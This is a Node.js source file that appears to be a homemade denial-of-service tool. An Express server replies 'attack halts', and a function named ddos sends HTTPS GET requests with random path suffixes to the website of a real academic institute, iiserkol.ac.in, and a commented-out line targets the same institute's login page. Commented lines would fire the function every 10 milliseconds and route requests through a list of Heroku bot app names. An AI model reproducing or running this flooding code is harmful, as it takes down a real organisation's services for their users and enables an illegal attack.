const http=require('http')
const https=require('https')
const express = require("express")
const hostname='0.0.0.0';
const port=process.env.PORT || 8021;
const app=express();
const server=http.createServer(app)
const botArray=["tatras4","tatras5","tatras6","tatras7","tatras8","tatras9","tatras10","tatras11","tatras12","tatras13","fadros","fedros","pytras","accalia","admetus","felixsa","ethanio","caspas","thorax","thoru","fagona","fagrus","cypruss","gapris","tikana","takris","fadnavis","crocasa","rasmon","rassas","dasnoma","dhanisa"]
const listener=server.listen(port,hostname,()=>{console.log("Server spinned up on port "+listener.address().port)});
app.get("/",(req,res,next)=>{
res.send("attack halts")
res.end()

})
// process.on("message",(msg)=>{
// ddos(msg.initial)
// })

// setInterval(ddos,10)
// console.log("attack starts")
var count=0;
function ddos(){

    // const uril="http://"+botArray[count]+".herokuapp.com?index="+count+"&count=3"
    // const uril ="http://tatras4.herokuapp.com?index=0&count=3"
    // console.log(uril)
    const extra="pics"+Math.random()
    const uril="https://www.iiserkol.ac.in/web/en/#gsc.tab=0/"+extra
    //const uril="https://welearn.iiserkol.ac.in/login/index.php"
    // count=count+1;
    // if(count>=botArray.length) count=0;
    https.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
        let pythonData = '';
      
        // A chunk of data has been recieved.
        resp.on('data', (chunk) => {
          pythonData += chunk;
        });
      
        // The whole response has been received. Print out the result.
        resp.on('end', () => {
            // console.log(pythonData + botArray[count-4])
            // console.log(pythonData)
        });
      
      }).on("error", (err) => {
        console.log("Error: " + err.message);
      });
}